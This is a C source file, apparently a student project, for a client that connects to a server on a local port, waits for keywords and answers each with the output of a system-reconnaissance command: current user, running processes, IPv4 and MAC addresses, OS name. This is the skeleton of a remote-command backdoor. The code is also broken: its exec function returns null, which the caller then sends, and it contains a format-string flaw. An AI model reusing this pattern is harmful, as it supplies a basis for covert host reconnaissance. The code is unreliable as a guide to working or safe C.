//
// Last updated 4/16/21 at 4:56pm
//

// client.c
// Liam Barry, Carly Etlinger, Calista Gasper
// This is the client program.

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>

#define PORT 1242
#define FILENAME "commandresult.txt"

// equivalent to system()
char* exec(const char* command, int sock) {

    FILE *fp;
    FILE *file = fopen(FILENAME, "w+");
    char path[1035];

    /* Open the command for reading. */
    fp = popen(command, "r");
    if (fp == NULL) {
        printf("Failed to run command\n" );
        exit(1);
    }

    /* Read the output a line at a time - output it. */
    while (fgets(path, sizeof(path), fp) != NULL) {
        printf("%s", path);
        fprintf(file, path);
        //write(sock, path, sizeof(path));
    }


    return 0;
}

int main(){
    int sock;
    struct sockaddr_in server;
    // char *hello = "Hello from client";
    char * buffer[1024];
    char serverResponse[2000];
    //int data;
    int readSize;
    char* data = NULL;

    // create the socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        printf("Failed to create socket");
    }
    puts("Socket created successfully");

    // Creating the sockaddr_in structure with values
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);

    // connect to remote server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        // output error in connecting to remote server
        perror("Connection to server failed");
        return 1;
    }
    puts("Connected to server successfully\n");



    // now wait for command from server
    while((readSize = recv(sock, buffer, 1024, 0)) > 0){

        // take the contents of the buffer and determine what command is trying to run -- run appropriate command
        char command1[50] = "whoami";
        char command2[10] = "TASKLIST";
        char command3[50] = "inetpro4";
        char command4[50] = "physical";
        char command5[50] = "opersyst";
        // add command for graceful teardown when server is done
        char command6[50] = "closesocket";

        if (strcmp(buffer, command1) == 0){
            data = exec(command1, sock);
            puts(data);
            printf("Sending results for 'whoami'\n");
            write(sock, data, strlen(data));
            continue;
        }

        if (strcmp(buffer, command2) == 0){
            data = exec(command2, sock);
            puts(data);
            printf("Sending results for 'tasklist'....");
            write(sock, data, strlen(data));
            continue;
        }

        if(strcmp(buffer, command3) == 0){
            data = exec("ipconfig /all | findstr /i \"ipv4\"",sock);
            puts(data);
            puts("Sending results for 'ipv4'....");
            write(sock, data, strlen(data));
            continue;
        }

        if(strcmp(buffer, command4) == 0){
            data = exec("ipconfig /all | findstr /i \"physical\"", sock);
            puts(data);
            puts("Sending results for 'MAC addr'....");
            write(sock, data, strlen(data));
            continue;
        }

        if(strcmp(buffer, command5) == 0){
            data = exec("systeminfo | findstr /B /C:\"OS Name\"", sock);
            puts(data);
            puts("Sending results for 'OS Name'...");
            write(sock, data, strlen(data));
            continue;
        }

        // teardown process when done with socket connection
        if(strcmp(buffer, command6) == 0)
        {
            close(sock);
            break;
        }
        
        if(readSize == 0)
        {
            puts("Server disconnected");
            fflush(stdout);
            break;
        }
        else if (readSize == -1)
        {
            perror("Receiving content from server failed");
            break;
        }
    }

    close(sock);
    return 0;
}

